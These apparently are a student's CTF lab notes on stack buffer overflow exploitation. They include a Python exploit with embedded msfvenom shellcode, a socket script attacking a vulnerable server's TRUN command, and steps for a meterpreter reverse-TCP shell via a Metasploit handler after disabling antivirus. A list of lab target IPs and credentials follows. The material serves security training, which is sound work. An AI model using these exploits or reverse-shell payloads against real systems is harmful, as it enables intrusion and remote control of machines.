Buffer Overflow: Filling the buffer with more data than the buffer contains, to send data to memory
EIP register tells the computer where to go for the next instruction, we can use this to make it do what we want, overwriting intended purpose.
Make it JMP to the ESP register, which can hold our malware.

LINUX:
pdisass to chenck functions in gdbwire
PAYLOAD = msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python


./func <<<$(./mybuff.py) runs command, take out <<< if it requires a command line arg
mybuff.py:
  1 #!/usr/bin/python2.7
  2 
  3 #Fill the Buffer
  4 buf = "A" * 62
  5 
  6 #EIP Register to JMP ESP
  7 buf += "\x59\x3b\xde\xf7"
  8 
  9 
 10 '''
 11 0xf7de3b59   "\59\x3b\xde\xf7"
 12 0xf7f588ab   
 13 0xf7f645fb
 14 0xf7f6460f
 15 0xf7f64aeb
 16 0xf7f64aff
 17 0xf7f64d6f
 18 '''
 19 
 20 #Give payload some extra room with NOP
 21 buf += "\x90" * 10
 22 
 23 #Insert payload ( msfvenom -p linux/x86/exec CMD="ifconfig && whoami" -b '\x00' -f python )
 24 buf += b"\xba\x8e\x26\xd3\xb9\xdb\xd0\xd9\x74\x24\xf4\x5b"
 25 buf += b"\x33\xc9\xb1\x0e\x31\x53\x14\x03\x53\x14\x83\xc3"
 26 buf += b"\x04\x6c\xd3\xb9\xb2\x28\x85\x6c\xa3\xa0\x98\xf3"
 27 buf += b"\xa2\xd7\x8b\xdc\xc7\x7f\x4c\x4b\x07\x1d\x25\xe5"
 28 buf += b"\xde\x02\xe7\x11\xf3\xc4\x08\xe2\x9d\xa2\x6b\x8d"
 29 buf += b"\x33\x4c\x05\x36\xec\xb6\xf3\x98\x9b\xde\x94\xb9"
 30 buf += b"\x0e\x77\x6b\x6d\x82\x0e\x8a\x5c\xa4"
 31 
 32 print(buf)



WINDOWS:
xfreerdp to get to win-ops
run exe
run tasklist for the exe
run netstat -ano | findstr "pid"
Lin-ops:
nc ip openport
HELP
Vuln Servers TRUN can be exploited
EXIT
vim SecureServerBuff.py


#!/usr/bin/python2.7
import socket
'''
addr
addr
'''


buf = "TRUN/.:/"

buf += "A" * 3000
#buf += "wirechars"
#buf += "\xad\xdr\xsw\xap" JMP ESP
#buf += "\x90" * 15
#buf += msfvenom command

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 socket

s.connect(("IP",port)) #IP and port connection
print s.recv(1024) #Recieve response
s.send(buf) #Sends buf to IP and port
print s.recv(1024) #recieve response
s.close() #close connection



run py, wait for response, if TRUN COMPLETE, need more A's
exe will die when sent too many

Win-ops:
ruin exe, run immunity debugger
DBG:
file, attach, exe
Watch CPU thread, shows program and registers
it will be paused, so press play Bottom right shows program state
Go to wiremask, and get needed number of chars to crash program
Lin-ops:
Put wiremask chars into buf, replacing A's
run py, should hangup
Win-ops:
check registers in CPU thread, put EIP hex into wiremask, and get the offset
Lin-ops:
edit py to be A * offset
Next is find JMP ESP, and make shell code
Win-ops:
In DBG, you can run modules at the bottom of the window,
run !mona modules (gets unprotected module), !mona jmp -r esp -m (unprot module"essfunc.dll") module will have all false, with no protection
CPU and Log Data are the two DBG windows we need
take some addresses from the find, you can right click and copy address
Lin-ops:
paste to py
run: msfvenom -p windows/meterpreter/reverse_tcp lhost=(Lin-ops) lport=(portonlin) -b "\x00" -f python, copy all but first line to script
Going to use a multihandler to catch the port connection
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT (port)
exploit
multi/handler is now listening
Win-ops:
run exe
turn off antivirus in windows virus and threat protection
Lin-ops:
run py
check meterpreter shell, should have a connection
shell
We're now on the machine

For the CTF, we'll find Secure Server
-L to connect to the TGT on port 9999
change tgt ip and port in script to local host and local port


Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine
